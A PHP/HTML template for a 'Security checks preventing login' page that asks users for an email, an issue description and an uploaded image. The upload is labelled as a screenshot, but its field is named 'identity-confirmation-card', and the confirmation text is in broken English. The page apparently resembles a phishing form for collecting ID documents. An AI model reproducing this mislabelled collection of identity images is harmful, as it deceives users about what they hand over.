<?php require("headers/prevented-header.php"); ?>
<div class="external--nav">
   <nav>
      <div class="prefixes">
         <a href="/prevented">
            <img src="/internal/icon/dca_logo.png" alt="Digital Collection Affiliate" draggable="false">
         </a>
      </div>
      <div class="prefixes f1">
         <div class="maintext"><span>Security checks preventing login</span></div>
      </div>
   </nav>
</div>
<div class="content">
   <div class="section successwrap">
      <h2 style="text-align:center;font-weight:600;margin-bottom:6px;">Request Has been sent</h2>
      <div style="font-size:15px;text-align:center;"><span>Congratulation request has been recieved we are scan your details and we send email for ralated to your preventing login within 24 Hour</span></div>
   </div>
   <div class="section sflex">
      <div><span>Do you want to log in to or Register Digital Collection Affiliate?</span></div>
      <div style="display:flex;column-gap:8px;align-items:center;">
         <a href="/login" style="--bg-color:#5a5acf;"><button>Log In</button></a>
         <div style="color:#2d686f;">or</div>
         <a href="/signup" style="--bg-color:#fb3535"><button>Register</button></a>
      </div>
   </div>
   <div class="section">
      <div class="header">
         <div class="headtext"><span>Security checks preventing login</span></div>
      </div>
      <form action="/GraphQL/prevented/?wauth=true&srw=preventing">
         <div class="fields email-field">
            <label for="email">Your email address</label>
            <input type="text" name="email" autocomplete="off" id="email" class="_3rmtyex">
            <div class="error"></div>
         </div>
         <div class="fields">
            <label for="description">Description of the issue</label>
            <textarea name="description" id="description" cols="30" rows="5" class="_3rmtyex"></textarea>
            <div class="error"></div>
         </div>
         <div class="fields">
            <label for="attachment">Screenshot (recommended)</label>
            <input type="file" name="identity-confirmation-card" id="attachment" accept="image/png, image/jpg, image/jpeg">
            <div class="error"></div>
         </div>
         <div style="font-size:15px;margin-bottom:8px;"><span>Thanks for taking the time to submit a report. While we don't reply to every report, we'll let you know if we need more details.</span></div>
         <div class="buttons">
            <button type="button">Previous</button>
            <button type="submit" id="websubmit" name="prevent-btn">Next</button>
         </div>
      </form>
   </div>
</div>
<script src="/scripts/prevented.js"></script>
<?php require("core/network-alert.php"); require("footer.php"); ?>